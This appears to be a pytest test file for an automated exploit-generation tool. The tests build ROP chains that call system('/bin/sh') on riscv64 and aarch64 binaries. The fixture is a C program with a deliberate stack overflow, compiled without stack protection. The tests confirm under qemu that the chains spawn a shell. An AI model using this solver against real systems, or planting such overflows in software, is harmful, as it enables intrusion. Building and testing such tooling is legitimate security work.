"""ROP-chain solver on LINK-REGISTER arches (riscv64, aarch64): where `ret`=`jr ra`/`ret x30` (no
stack pop), the chain is threaded through ra-restoring gadgets. rop_solver.solve_lr_chain composes a
LOADER (an epilogue that restores the callee-saved source/branch regs + the return register from the
overflow) feeding a `mv a0,sS; jr/br sB` CALLER -- set a0=&"/bin/sh", jump to `system` -> a REAL
shell. Confirmed under qemu-user with a negative control. The gadgets are DISCOVERED by the semantic
engine (gadget_emu), so the solver composes from the target's actual gadgets, not a fixed shape.

system("/bin/sh") is one-argument, so it sidesteps the a1/a2 (argv/envp) gadget-scarcity wall that
blocks the multi-register execve-syscall chain on these arches."""
import shutil
import subprocess

import pytest
from lykos.analyze.poc import attribution, exploit, gadget_emu, rop, rop_solver
from lykos.analyze.poc import exploit_stage as es
from lykos.analyze.poc.capture import make_qemu_capture
from lykos.analyze.poc import primitive

_SRC = (
    '#include <unistd.h>\n#include <stdlib.h>\n'
    'char binsh[] = "/bin/sh";\n'
    'void vuln(void){ char b[64]; read(0,b,512); }\n'
    'int main(void){ if(getpid()==-1) system(binsh); vuln(); return 0; }\n')


def _run(arch, gcc, qemu, tmp_path):
    if not (gcc and qemu and gadget_emu.available()):
        pytest.skip(f"needs {arch} toolchain + qemu + unicorn/capstone")
    src = tmp_path / "v.c"
    src.write_text(_SRC)
    exe = tmp_path / "v"
    if subprocess.run([gcc, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip(f"cannot build {arch} fixture")
    data = exe.read_bytes()
    system = (exploit.elf_functions(data).get("system")
              or rop.libc_symbols(data, ("system",)).get("system"))
    binsh = rop.find_string(data, b"/bin/sh")
    assert system and binsh

    cap = make_qemu_capture(exe, arch, "stdin", [], 12, endianness="little", bits=64)
    rec = primitive.recover_ip_offset(cap(bytes(primitive.cyclic(300))), 300,
                                      endian="little", word=8)
    offset = rec[0] if rec else 72

    # THE SOLVER: given only {a0=&"/bin/sh", target=system} it discovers the loader+caller gadgets
    # and composes the ra-threaded chain candidates.
    cands = rop_solver.solve_lr_chain(data, arch, set_a0=binsh, call_va=system, offset=offset)
    assert cands, f"solver composed no {arch} chain"

    hit = None
    for c in cands:
        m = attribution.make_code_markers()
        if m.proves(es._qemu_shell_detonate(exe, arch, "little", 64, c["payload"], m, 12.0)):
            hit = c
            break
    assert hit, f"no solver-composed {arch} chain spawned a shell"

    # negative control: a wrong &"/bin/sh" (same loader/caller/position) must NOT spawn a shell
    neg = rop_solver.solve_lr_chain(data, arch, set_a0=binsh ^ 0xFFFF, call_va=system, offset=offset)
    nc = next((c for c in neg if (c["loader"], c["caller"], c["stack_pos"])
               == (hit["loader"], hit["caller"], hit["stack_pos"])), None)
    assert nc is not None
    m2 = attribution.make_code_markers()
    assert not m2.proves(es._qemu_shell_detonate(exe, arch, "little", 64, nc["payload"], m2, 12.0))


_RV_GCC = shutil.which("riscv64-linux-gnu-gcc")
_RV_QEMU = shutil.which("qemu-riscv64") or shutil.which("qemu-riscv64-static")
_AA_GCC = shutil.which("aarch64-linux-gnu-gcc")
_AA_QEMU = shutil.which("qemu-aarch64") or shutil.which("qemu-aarch64-static")


def test_lr_solver_system_shell_riscv64(tmp_path):
    _run("riscv64", _RV_GCC, _RV_QEMU, tmp_path)


def test_lr_solver_system_shell_aarch64(tmp_path):
    _run("aarch64", _AA_GCC, _AA_QEMU, tmp_path)


def _run_stage(arch, gcc, qemu, store, tmp_path):
    """The build_exploit STAGE files a solver-composed L3 for a link-register target. strategy=
    "rop" is the isolator: the byte-pattern cross-arch ret2libc clauses are gated `strategy==
    "auto"`, so under "rop" the ONLY cross-arch clause that can fire is the semantic-solver
    fallback (_lr_solver_ret2libc_exploit). A verified L3 under that strategy therefore PROVES the
    solver path composed, confirmed (shell + a0-corrupting negative control) and filed it through
    the shared drive_cross_ret2libc tail -- the exact wiring the autopilot drives under "auto"."""
    if not (gcc and qemu and gadget_emu.available()):
        pytest.skip(f"needs {arch} toolchain + qemu + unicorn/capstone")
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(_SRC)
    exe = tmp_path / "v"
    if subprocess.run([gcc, "-no-pie", "-static", "-fno-stack-protector", "-w",
                       str(src), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip(f"cannot build {arch} fixture")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create("lrsolv").id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        assert (store.targets.get(t.id).mitigations or {}).get("nx") != "off"   # NX on (ret2libc)
        run = enqueue_exploit(q, t, params={"strategy": "rop", "timeout": 12})
        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, f"the build_exploit stage filed no solver-composed L3 for {arch}"
    # provenance: the finding must be the SOLVER's (dedup_key slug ends in -solver), proving the
    # fallback -- not some other clause -- filed it.
    row = store.conn.execute(
        "SELECT title FROM finding WHERE target_id=? AND dedup_key LIKE ?",
        (t.id, "exploit:%-solver:%")).fetchone()
    assert row is not None, "L3 was filed but not via the semantic-solver fallback"
    assert "solver" in (row["title"] or "").lower()


def test_lr_solver_stage_files_l3_riscv64(store, tmp_path):
    _run_stage("riscv64", _RV_GCC, _RV_QEMU, store, tmp_path)


def test_lr_solver_stage_files_l3_aarch64(store, tmp_path):
    _run_stage("aarch64", _AA_GCC, _AA_QEMU, store, tmp_path)
